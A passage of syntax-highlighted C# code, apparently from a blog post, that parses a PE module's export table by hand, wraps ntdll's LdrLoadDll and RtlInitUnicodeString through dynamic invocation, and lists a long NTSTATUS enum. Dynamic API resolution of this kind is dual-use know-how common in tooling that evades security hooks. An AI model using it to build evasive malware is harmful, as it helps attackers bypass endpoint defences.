</span></span><span style="display:flex;"><span>				Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + <span style="color:#ae81ff">0x3C</span>));
</span></span><span style="display:flex;"><span>				Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + <span style="color:#ae81ff">0x14</span>));
</span></span><span style="display:flex;"><span>				Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + <span style="color:#ae81ff">0x18</span>;
</span></span><span style="display:flex;"><span>				Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
</span></span><span style="display:flex;"><span>				Int64 pExport = <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> (Magic == <span style="color:#ae81ff">0x010b</span>)
</span></span><span style="display:flex;"><span>				{
</span></span><span style="display:flex;"><span>					pExport = OptHeader + <span style="color:#ae81ff">0x60</span>;
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>				{
</span></span><span style="display:flex;"><span>					pExport = OptHeader + <span style="color:#ae81ff">0x70</span>;
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>				<span style="color:#75715e">// Read -&gt; IMAGE_EXPORT_DIRECTORY</span>
</span></span><span style="display:flex;"><span>				Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
</span></span><span style="display:flex;"><span>				Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + <span style="color:#ae81ff">0x10</span>));
</span></span><span style="display:flex;"><span>				Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + <span style="color:#ae81ff">0x14</span>));
</span></span><span style="display:flex;"><span>				Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + <span style="color:#ae81ff">0x18</span>));
</span></span><span style="display:flex;"><span>				Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + <span style="color:#ae81ff">0x1C</span>));
</span></span><span style="display:flex;"><span>				Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + <span style="color:#ae81ff">0x20</span>));
</span></span><span style="display:flex;"><span>				Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + <span style="color:#ae81ff">0x24</span>));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>				<span style="color:#75715e">// Get the VAs of the name table&#39;s beginning and end.</span>
</span></span><span style="display:flex;"><span>				Int64 NamesBegin = ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA));
</span></span><span style="display:flex;"><span>				Int64 NamesFinal = NamesBegin + NumberOfNames * <span style="color:#ae81ff">4</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>				<span style="color:#75715e">// Loop the array of export name RVA&#39;s</span>
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i = <span style="color:#ae81ff">0</span>; i &lt; NumberOfNames; i++)
</span></span><span style="display:flex;"><span>				{
</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">string</span> FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * <span style="color:#ae81ff">4</span>))));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">if</span> (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase))
</span></span><span style="display:flex;"><span>					{
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>						Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * <span style="color:#ae81ff">2</span>)) + OrdinalBase;
</span></span><span style="display:flex;"><span>						Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (<span style="color:#ae81ff">4</span> * (FunctionOrdinal - OrdinalBase))));
</span></span><span style="display:flex;"><span>						FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>						<span style="color:#66d9ef">if</span> (ResolveForwards == <span style="color:#66d9ef">true</span>)
</span></span><span style="display:flex;"><span>							<span style="color:#75715e">// If the export address points to a forward, get the address</span>
</span></span><span style="display:flex;"><span>							<span style="color:#75715e">// FunctionPtr = GetForwardAddress(FunctionPtr);</span>
</span></span><span style="display:flex;"><span>							FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>						<span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>					}
</span></span><span style="display:flex;"><span>				}
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">catch</span>
</span></span><span style="display:flex;"><span>			{
</span></span><span style="display:flex;"><span>				<span style="color:#75715e">// Catch parser failure</span>
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> InvalidOperationException(<span style="color:#e6db74">&#34;Failed to parse module exports.&#34;</span>);
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (FunctionPtr == IntPtr.Zero)
</span></span><span style="display:flex;"><span>			{
</span></span><span style="display:flex;"><span>				<span style="color:#75715e">// Export not found</span>
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> MissingMethodException(ExportName + <span style="color:#e6db74">&#34;, export not found.&#34;</span>);
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> FunctionPtr;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> RtlInitUnicodeString(<span style="color:#66d9ef">ref</span> STRUCTS.UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] <span style="color:#66d9ef">string</span> SourceString)
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// Craft an array for the arguments</span>
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">object</span>[] funcargs =
</span></span><span style="display:flex;"><span>			{
</span></span><span style="display:flex;"><span>				DestinationString, SourceString
</span></span><span style="display:flex;"><span>			};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			DynamicAPIInvoke(<span style="color:#e6db74">@&#34;ntdll.dll&#34;</span>, <span style="color:#e6db74">@&#34;RtlInitUnicodeString&#34;</span>, <span style="color:#66d9ef">typeof</span>(DELEGATES.RtlInitUnicodeString), <span style="color:#66d9ef">ref</span> funcargs);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// Update the modified variables</span>
</span></span><span style="display:flex;"><span>			DestinationString = (STRUCTS.UNICODE_STRING)funcargs[<span style="color:#ae81ff">0</span>];
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> STRUCTS.NTSTATUS LdrLoadDll(IntPtr PathToFile, UInt32 dwFlags, <span style="color:#66d9ef">ref</span> STRUCTS.UNICODE_STRING ModuleFileName, <span style="color:#66d9ef">ref</span> IntPtr ModuleHandle)
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// Craft an array for the arguments</span>
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">object</span>[] funcargs =
</span></span><span style="display:flex;"><span>			{
</span></span><span style="display:flex;"><span>				PathToFile, dwFlags, ModuleFileName, ModuleHandle
</span></span><span style="display:flex;"><span>			};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			STRUCTS.NTSTATUS retValue = (STRUCTS.NTSTATUS)DynamicAPIInvoke(<span style="color:#e6db74">@&#34;ntdll.dll&#34;</span>, <span style="color:#e6db74">@&#34;LdrLoadDll&#34;</span>, <span style="color:#66d9ef">typeof</span>(DELEGATES.LdrLoadDll), <span style="color:#66d9ef">ref</span> funcargs);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// Update the modified variables</span>
</span></span><span style="display:flex;"><span>			ModuleHandle = (IntPtr)funcargs[<span style="color:#ae81ff">3</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> retValue;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Corressponding structs and enums</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">STRUCTS</span>
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">//NTSTATUS is an undocument enum. https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-erref/596a1078-e883-4972-9bbc-49e60bebca55</span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// https://dinvoke.net/en/ntdll/NTSTATUS</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">enum</span> NTSTATUS : <span style="color:#66d9ef">uint</span>
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// Success</span>
</span></span><span style="display:flex;"><span>			Success = <span style="color:#ae81ff">0x00000000</span>,
</span></span><span style="display:flex;"><span>			Wait1 = <span style="color:#ae81ff">0x00000001</span>,
</span></span><span style="display:flex;"><span>			Wait2 = <span style="color:#ae81ff">0x00000002</span>,
</span></span><span style="display:flex;"><span>			Wait3 = <span style="color:#ae81ff">0x00000003</span>,
</span></span><span style="display:flex;"><span>			Wait63 = <span style="color:#ae81ff">0x0000003f</span>,
</span></span><span style="display:flex;"><span>			Abandoned = <span style="color:#ae81ff">0x00000080</span>,
</span></span><span style="display:flex;"><span>			AbandonedWait0 = <span style="color:#ae81ff">0x00000080</span>,
</span></span><span style="display:flex;"><span>			AbandonedWait1 = <span style="color:#ae81ff">0x00000081</span>,
</span></span><span style="display:flex;"><span>			AbandonedWait2 = <span style="color:#ae81ff">0x00000082</span>,
</span></span><span style="display:flex;"><span>			AbandonedWait3 = <span style="color:#ae81ff">0x00000083</span>,
</span></span><span style="display:flex;"><span>			AbandonedWait63 = <span style="color:#ae81ff">0x000000bf</span>,
</span></span><span style="display:flex;"><span>			UserApc = <span style="color:#ae81ff">0x000000c0</span>,
</span></span><span style="display:flex;"><span>			KernelApc = <span style="color:#ae81ff">0x00000100</span>,
</span></span><span style="display:flex;"><span>			Alerted = <span style="color:#ae81ff">0x00000101</span>,
</span></span><span style="display:flex;"><span>			Timeout = <span style="color:#ae81ff">0x00000102</span>,
</span></span><span style="display:flex;"><span>			Pending = <span style="color:#ae81ff">0x00000103</span>,
</span></span><span style="display:flex;"><span>			Reparse = <span style="color:#ae81ff">0x00000104</span>,
</span></span><span style="display:flex;"><span>			MoreEntries = <span style="color:#ae81ff">0x00000105</span>,
</span></span><span style="display:flex;"><span>			NotAllAssigned = <span style="color:#ae81ff">0x00000106</span>,
</span></span><span style="display:flex;"><span>			SomeNotMapped = <span style="color:#ae81ff">0x00000107</span>,
</span></span><span style="display:flex;"><span>			OpLockBreakInProgress = <span style="color:#ae81ff">0x00000108</span>,
</span></span><span style="display:flex;"><span>			VolumeMounted = <span style="color:#ae81ff">0x00000109</span>,
</span></span><span style="display:flex;"><span>			RxActCommitted = <span style="color:#ae81ff">0x0000010a</span>,
</span></span><span style="display:flex;"><span>			NotifyCleanup = <span style="color:#ae81ff">0x0000010b</span>,
</span></span><span style="display:flex;"><span>			NotifyEnumDir = <span style="color:#ae81ff">0x0000010c</span>,
</span></span><span style="display:flex;"><span>			NoQuotasForAccount = <span style="color:#ae81ff">0x0000010d</span>,
</span></span><span style="display:flex;"><span>			PrimaryTransportConnectFailed = <span style="color:#ae81ff">0x0000010e</span>,
</span></span><span style="display:flex;"><span>			PageFaultTransition = <span style="color:#ae81ff">0x00000110</span>,
</span></span><span style="display:flex;"><span>			PageFaultDemandZero = <span style="color:#ae81ff">0x00000111</span>,
</span></span><span style="display:flex;"><span>			PageFaultCopyOnWrite = <span style="color:#ae81ff">0x00000112</span>,
</span></span><span style="display:flex;"><span>			PageFaultGuardPage = <span style="color:#ae81ff">0x00000113</span>,
</span></span><span style="display:flex;"><span>			PageFaultPagingFile = <span style="color:#ae81ff">0x00000114</span>,
</span></span><span style="display:flex;"><span>			CrashDump = <span style="color:#ae81ff">0x00000116</span>,
</span></span><span style="display:flex;"><span>			ReparseObject = <span style="color:#ae81ff">0x00000118</span>,
</span></span><span style="display:flex;"><span>			NothingToTerminate = <span style="color:#ae81ff">0x00000122</span>,
</span></span><span style="display:flex;"><span>			ProcessNotInJob = <span style="color:#ae81ff">0x00000123</span>,
</span></span><span style="display:flex;"><span>			ProcessInJob = <span style="color:#ae81ff">0x00000124</span>,
</span></span><span style="display:flex;"><span>			ProcessCloned = <span style="color:#ae81ff">0x00000129</span>,
</span></span><span style="display:flex;"><span>			FileLockedWithOnlyReaders = <span style="color:#ae81ff">0x0000012a</span>,
</span></span><span style="display:flex;"><span>			FileLockedWithWriters = <span style="color:#ae81ff">0x0000012b</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// Informational</span>
</span></span><span style="display:flex;"><span>			Informational = <span style="color:#ae81ff">0x40000000</span>,
</span></span><span style="display:flex;"><span>			ObjectNameExists = <span style="color:#ae81ff">0x40000000</span>,
</span></span><span style="display:flex;"><span>			ThreadWasSuspended = <span style="color:#ae81ff">0x40000001</span>,
</span></span><span style="display:flex;"><span>			WorkingSetLimitRange = <span style="color:#ae81ff">0x40000002</span>,
</span></span><span style="display:flex;"><span>			ImageNotAtBase = <span style="color:#ae81ff">0x40000003</span>,
</span></span><span style="display:flex;"><span>			RegistryRecovered = <span style="color:#ae81ff">0x40000009</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// Warning</span>
</span></span><span style="display:flex;"><span>			Warning = <span style="color:#ae81ff">0x80000000</span>,
</span></span><span style="display:flex;"><span>			GuardPageViolation = <span style="color:#ae81ff">0x80000001</span>,
</span></span><span style="display:flex;"><span>			DatatypeMisalignment = <span style="color:#ae81ff">0x80000002</span>,
</span></span><span style="display:flex;"><span>			Breakpoint = <span style="color:#ae81ff">0x80000003</span>,
</span></span><span style="display:flex;"><span>			SingleStep = <span style="color:#ae81ff">0x80000004</span>,
</span></span><span style="display:flex;"><span>			BufferOverflow = <span style="color:#ae81ff">0x80000005</span>,
</span></span><span style="display:flex;"><span>			NoMoreFiles = <span style="color:#ae81ff">0x80000006</span>,
</span></span><span style="display:flex;"><span>			HandlesClosed = <span style="color:#ae81ff">0x8000000a</span>,
</span></span><span style="display:flex;"><span>			PartialCopy = <span style="color:#ae81ff">0x8000000d</span>,
</span></span><span style="display:flex;"><span>			DeviceBusy = <span style="color:#ae81ff">0x80000011</span>,
</span></span><span style="display:flex;"><span>			InvalidEaName = <span style="color:#ae81ff">0x80000013</span>,
</span></span><span style="display:flex;"><span>			EaListInconsistent = <span style="color:#ae81ff">0x80000014</span>,
</span></span><span style="display:flex;"><span>			NoMoreEntries = <span style="color:#ae81ff">0x8000001a</span>,
</span></span><span style="display:flex;"><span>			LongJump = <span style="color:#ae81ff">0x80000026</span>,
</span></span><span style="display:flex;"><span>			DllMightBeInsecure = <span style="color:#ae81ff">0x8000002b</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// Error</span>
</span></span><span style="display:flex;"><span>			Error = <span style="color:#ae81ff">0xc0000000</span>,
</span></span><span style="display:flex;"><span>			Unsuccessful = <span style="color:#ae81ff">0xc0000001</span>,
</span></span><span style="display:flex;"><span>			NotImplemented = <span style="color:#ae81ff">0xc0000002</span>,
</span></span><span style="display:flex;"><span>			InvalidInfoClass = <span style="color:#ae81ff">0xc0000003</span>,
</span></span><span style="display:flex;"><span>			InfoLengthMismatch = <span style="color:#ae81ff">0xc0000004</span>,
</span></span><span style="display:flex;"><span>			AccessViolation = <span style="color:#ae81ff">0xc0000005</span>,
</span></span><span style="display:flex;"><span>			InPageError = <span style="color:#ae81ff">0xc0000006</span>,
</span></span><span style="display:flex;"><span>			PagefileQuota = <span style="color:#ae81ff">0xc0000007</span>,
</span></span><span style="display:flex;"><span>			InvalidHandle = <span style="color:#ae81ff">0xc0000008</span>,
</span></span><span style="display:flex;"><span>			BadInitialStack = <span style="color:#ae81ff">0xc0000009</span>,
</span></span><span style="display:flex;"><span>			BadInitialPc = <span style="color:#ae81ff">0xc000000a</span>,
</span></span><span style="display:flex;"><span>			InvalidCid = <span style="color:#ae81ff">0xc000000b</span>,
</span></span><span style="display:flex;"><span>			TimerNotCanceled = <span style="color:#ae81ff">0xc000000c</span>,
</span></span><span style="display:flex;"><span>			InvalidParameter = <span style="color:#ae81ff">0xc000000d</span>,
</span></span><span style="display:flex;"><span>			NoSuchDevice = <span style="color:#ae81ff">0xc000000e</span>,
</span></span><span style="display:flex;"><span>			NoSuchFile = <span style="color:#ae81ff">0xc000000f</span>,
</span></span><span style="display:flex;"><span>			InvalidDeviceRequest = <span style="color:#ae81ff">0xc0000010</span>,
</span></span><span style="display:flex;"><span>			EndOfFile = <span style="color:#ae81ff">0xc0000011</span>,
</span></span><span style="display:flex;"><span>			WrongVolume = <span style="color:#ae81ff">0xc0000012</span>,
</span></span><span style="display:flex;"><span>			NoMediaInDevice = <span style="color:#ae81ff">0xc0000013</span>,
</span></span><span style="display:flex;"><span>			NoMemory = <span style="color:#ae81ff">0xc0000017</span>,
</span></span><span style="display:flex;"><span>			ConflictingAddresses = <span style="color:#ae81ff">0xc0000018</span>,
</span></span><span style="display:flex;"><span>			NotMappedView = <span style="color:#ae81ff">0xc0000019</span>,
</span></span><span style="display:flex;"><span>			UnableToFreeVm = <span style="color:#ae81ff">0xc000001a</span>,
</span></span><span style="display:flex;"><span>			UnableToDeleteSection = <span style="color:#ae81ff">0xc000001b</span>,
</span></span><span style="display:flex;"><span>			IllegalInstruction = <span style="color:#ae81ff">0xc000001d</span>,
</span></span><span style="display:flex;"><span>			AlreadyCommitted = <span style="color:#ae81ff">0xc0000021</span>,
</span></span><span style="display:flex;"><span>			AccessDenied = <span style="color:#ae81ff">0xc0000022</span>,
</span></span><span style="display:flex;"><span>			BufferTooSmall = <span style="color:#ae81ff">0xc0000023</span>,
</span></span><span style="display:flex;"><span>			ObjectTypeMismatch = <span style="color:#ae81ff">0xc0000024</span>,
</span></span><span style="display:flex;"><span>			NonContinuableException = <span style="color:#ae81ff">0xc0000025</span>,
</span></span><span style="display:flex;"><span>			BadStack = <span style="color:#ae81ff">0xc0000028</span>,
</span></span><span style="display:flex;"><span>			NotLocked = <span style="color:#ae81ff">0xc000002a</span>,
</span></span><span style="display:flex;"><span>			NotCommitted = <span style="color:#ae81ff">0xc000002d</span>,
</span></span><span style="display:flex;"><span>			InvalidParameterMix = <span style="color:#ae81ff">0xc0000030</span>,
</span></span><span style="display:flex;"><span>			ObjectNameInvalid = <span style="color:#ae81ff">0xc0000033</span>,
</span></span><span style="display:flex;"><span>			ObjectNameNotFound = <span style="color:#ae81ff">0xc0000034</span>,
</span></span><span style="display:flex;"><span>			ObjectNameCollision = <span style="color:#ae81ff">0xc0000035</span>,
</span></span><span style="display:flex;"><span>			ObjectPathInvalid = <span style="color:#ae81ff">0xc0000039</span>,
</span></span><span style="display:flex;"><span>			ObjectPathNotFound = <span style="color:#ae81ff">0xc000003a</span>,
</span></span><span style="display:flex;"><span>			ObjectPathSyntaxBad = <span style="color:#ae81ff">0xc000003b</span>,
</span></span><span style="display:flex;"><span>			DataOverrun = <span style="color:#ae81ff">0xc000003c</span>,
</span></span><span style="display:flex;"><span>			DataLate = <span style="color:#ae81ff">0xc000003d</span>,
</span></span><span style="display:flex;"><span>			DataError = <span style="color:#ae81ff">0xc000003e</span>,
</span></span><span style="display:flex;"><span>			CrcError = <span style="color:#ae81ff">0xc000003f</span>,
</span></span><span style="display:flex;"><span>			SectionTooBig = <span style="color:#ae81ff">0xc0000040</span>,
</span></span><span style="display:flex;"><span>			PortConnectionRefused = <span style="color:#ae81ff">0xc0000041</span>,
</span></span><span style="display:flex;"><span>			InvalidPortHandle = <span style="color:#ae81ff">0xc0000042</span>,
</span></span><span style="display:flex;"><span>			SharingViolation = <span style="color:#ae81ff">0xc0000043</span>,
</span></span><span style="display:flex;"><span>			QuotaExceeded = <span style="color:#ae81ff">0xc0000044</span>,
</span></span><span style="display:flex;"><span>			InvalidPageProtection = <span style="color:#ae81ff">0xc0000045</span>,
</span></span><span style="display:flex;"><span>			MutantNotOwned = <span style="color:#ae81ff">0xc0000046</span>,
</span></span><span style="display:flex;"><span>			SemaphoreLimitExceeded = <span style="color:#ae81ff">0xc0000047</span>,
</span></span><span style="display:flex;"><span>			PortAlreadySet = <span style="color:#ae81ff">0xc0000048</span>,
</span></span><span style="display:flex;"><span>			SectionNotImage = <span style="color:#ae81ff">0xc0000049</span>,
</span></span><span style="display:flex;"><span>			SuspendCountExceeded = <span style="color:#ae81ff">0xc000004a</span>,
</span></span><span style="display:flex;"><span>			ThreadIsTerminating = <span style="color:#ae81ff">0xc000004b</span>,
</span></span><span style="display:flex;"><span>			BadWorkingSetLimit = <span style="color:#ae81ff">0xc000004c</span>,
</span></span><span style="display:flex;"><span>			IncompatibleFileMap = <span style="color:#ae81ff">0xc000004d</span>,
</span></span><span style="display:flex;"><span>			SectionProtection = <span style="color:#ae81ff">0xc000004e</span>,
</span></span><span style="display:flex;"><span>			EasNotSupported = <span style="color:#ae81ff">0xc000004f</span>,
</span></span><span style="display:flex;"><span>			EaTooLarge = <span style="color:#ae81ff">0xc0000050</span>,
</span></span><span style="display:flex;"><span>			NonExistentEaEntry = <span style="color:#ae81ff">0xc0000051</span>,
</span></span><span style="display:flex;"><span>			NoEasOnFile = <span style="color:#ae81ff">0xc0000052</span>,
</span></span><span style="display:flex;"><span>			EaCorruptError = <span style="color:#ae81ff">0xc0000053</span>,
</span></span><span style="display:flex;"><span>			FileLockConflict = <span style="color:#ae81ff">0xc0000054</span>,
</span></span><span style="display:flex;"><span>			LockNotGranted = <span style="color:#ae81ff">0xc0000055</span>,
</span></span><span style="display:flex;"><span>			DeletePending = <span style="color:#ae81ff">0xc0000056</span>,
</span></span><span style="display:flex;"><span>			CtlFileNotSupported = <span style="color:#ae81ff">0xc0000057</span>,
</span></span><span style="display:flex;"><span>			UnknownRevision = <span style="color:#ae81ff">0xc0000058</span>,
</span></span><span style="display:flex;"><span>			RevisionMismatch = <span style="color:#ae81ff">0xc0000059</span>,
</span></span><span style="display:flex;"><span>			InvalidOwner = <span style="color:#ae81ff">0xc000005a</span>,
</span></span><span style="display:flex;"><span>			InvalidPrimaryGroup = <span style="color:#ae81ff">0xc000005b</span>,
</span></span><span style="display:flex;"><span>			NoImpersonationToken = <span style="color:#ae81ff">0xc000005c</span>,
</span></span><span style="display:flex;"><span>			CantDisableMandatory = <span style="color:#ae81ff">0xc000005d</span>,
</span></span><span style="display:flex;"><span>			NoLogonServers = <span style="color:#ae81ff">0xc000005e</span>,
</span></span><span style="display:flex;"><span>			NoSuchLogonSession = <span style="color:#ae81ff">0xc000005f</span>,
</span></span><span style="display:flex;"><span>			NoSuchPrivilege = <span style="color:#ae81ff">0xc0000060</span>,
</span></span><span style="display:flex;"><span>			PrivilegeNotHeld = <span style="color:#ae81ff">0xc0000061</span>,
</span></span><span style="display:flex;"><span>			InvalidAccountName = <span style="color:#ae81ff">0xc0000062</span>,
</span></span><span style="display:flex;"><span>			UserExists = <span style="color:#ae81ff">0xc0000063</span>,
</span></span><span style="display:flex;"><span>			NoSuchUser = <span style="color:#ae81ff">0xc0000064</span>,
</span></span><span style="display:flex;"><span>			GroupExists = <span style="color:#ae81ff">0xc0000065</span>,
</span></span><span style="display:flex;"><span>			NoSuchGroup = <span style="color:#ae81ff">0xc0000066</span>,
</span></span><span style="display:flex;"><span>			MemberInGroup = <span style="color:#ae81ff">0xc0000067</span>,
</span></span><span style="display:flex;"><span>			MemberNotInGroup = <span style="color:#ae81ff">0xc0000068</span>,
</span></span><span style="display:flex;"><span>			LastAdmin = <span style="color:#ae81ff">0xc0000069</span>,
</span></span><span style="display:flex;"><span>			WrongPassword = <span style="color:#ae81ff">0xc000006a</span>,
</span></span><span style="display:flex;"><span>			IllFormedPassword = <span style="color:#ae81ff">0xc000006b</span>,
</span></span><span style="display:flex;"><span>			PasswordRestriction = <span style="color:#ae81ff">0xc000006c</span>,
</span></span><span style="display:flex;"><span>			LogonFailure = <span style="color:#ae81ff">0xc000006d</span>,
</span></span><span style="display:flex;"><span>			AccountRestriction = <span style="color:#ae81ff">0xc000006e</span>,
</span></span><span style="display:flex;"><span>			InvalidLogonHours = <span style="color:#ae81ff">0xc000006f</span>,
</span></span><span style="display:flex;"><span>			InvalidWorkstation = <span style="color:#ae81ff">0xc0000070</span>,
</span></span><span style="display:flex;"><span>			PasswordExpired = <span style="color:#ae81ff">0xc0000071</span>,
</span></span><span style="display:flex;"><span>			AccountDisabled = <span style="color:#ae81ff">0xc0000072</span>,
</span></span><span style="display:flex;"><span>			NoneMapped = <span style="color:#ae81ff">0xc0000073</span>,
</span></span><span style="display:flex;"><span>			TooManyLuidsRequested = <span style="color:#ae81ff">0xc0000074</span>,
</span></span><span style="display:flex;"><span>			LuidsExhausted = <span style="color:#ae81ff">0xc0000075</span>,
</span></span><span style="display:flex;"><span>			InvalidSubAuthority = <span style="color:#ae81ff">0xc0000076</span>,
</span></span><span style="display:flex;"><span>			InvalidAcl = <span style="color:#ae81ff">0xc0000077</span>,
</span></span><span style="display:flex;"><span>			InvalidSid = <span style="color:#ae81ff">0xc0000078</span>,
</span></span><span style="display:flex;"><span>			InvalidSecurityDescr = <span style="color:#ae81ff">0xc0000079</span>,
</span></span><span style="display:flex;"><span>			ProcedureNotFound = <span style="color:#ae81ff">0xc000007a</span>,
</span></span><span style="display:flex;"><span>			InvalidImageFormat = <span style="color:#ae81ff">0xc000007b</span>,
</span></span><span style="display:flex;"><span>			NoToken = <span style="color:#ae81ff">0xc000007c</span>,
</span></span><span style="display:flex;"><span>			BadInheritanceAcl = <span style="color:#ae81ff">0xc000007d</span>,
</span></span><span style="display:flex;"><span>			RangeNotLocked = <span style="color:#ae81ff">0xc000007e</span>,
</span></span><span style="display:flex;"><span>			DiskFull = <span style="color:#ae81ff">0xc000007f</span>,
</span></span><span style="display:flex;"><span>			ServerDisabled = <span style="color:#ae81ff">0xc0000080</span>,
</span></span><span style="display:flex;"><span>			ServerNotDisabled = <span style="color:#ae81ff">0xc0000081</span>,
</span></span><span style="display:flex;"><span>			TooManyGuidsRequested = <span style="color:#ae81ff">0xc0000082</span>,
</span></span><span style="display:flex;"><span>			GuidsExhausted = <span style="color:#ae81ff">0xc0000083</span>,
</span></span><span style="display:flex;"><span>			InvalidIdAuthority = <span style="color:#ae81ff">0xc0000084</span>,
</span></span><span style="display:flex;"><span>			AgentsExhausted = <span style="color:#ae81ff">0xc0000085</span>,
</span></span><span style="display:flex;"><span>			InvalidVolumeLabel = <span style="color:#ae81ff">0xc0000086</span>,
</span></span><span style="display:flex;"><span>			SectionNotExtended = <span style="color:#ae81ff">0xc0000087</span>,
</span></span><span style="display:flex;"><span>			NotMappedData = <span style="color:#ae81ff">0xc0000088</span>,
</span></span><span style="display:flex;"><span>			ResourceDataNotFound = <span style="color:#ae81ff">0xc0000089</span>,
</span></span><span style="display:flex;"><span>			ResourceTypeNotFound = <span style="color:#ae81ff">0xc000008a</span>,
</span></span><span style="display:flex;"><span>			ResourceNameNotFound = <span style="color:#ae81ff">0xc000008b</span>,
</span></span><span style="display:flex;"><span>			ArrayBoundsExceeded = <span style="color:#ae81ff">0xc000008c</span>,
</span></span><span style="display:flex;"><span>			FloatDenormalOperand = <span style="color:#ae81ff">0xc000008d</span>,
</span></span><span style="display:flex;"><span>			FloatDivideByZero = <span style="color:#ae81ff">0xc000008e</span>,
</span></span><span style="display:flex;"><span>			FloatInexactResult = <span style="color:#ae81ff">0xc000008f</span>,
</span></span><span style="display:flex;"><span>			FloatInvalidOperation = <span style="color:#ae81ff">0xc0000090</span>,
</span></span><span style="display:flex;"><span>			FloatOverflow = <span style="color:#ae81ff">0xc0000091</span>,
</span></span><span style="display:flex;"><span>			FloatStackCheck = <span style="color:#ae81ff">0xc0000092</span>,
</span></span><span style="display:flex;"><span>			FloatUnderflow = <span style="color:#ae81ff">0xc0000093</span>,
</span></span><span style="display:flex;"><span>			IntegerDivideByZero = <span style="color:#ae81ff">0xc0000094</span>,
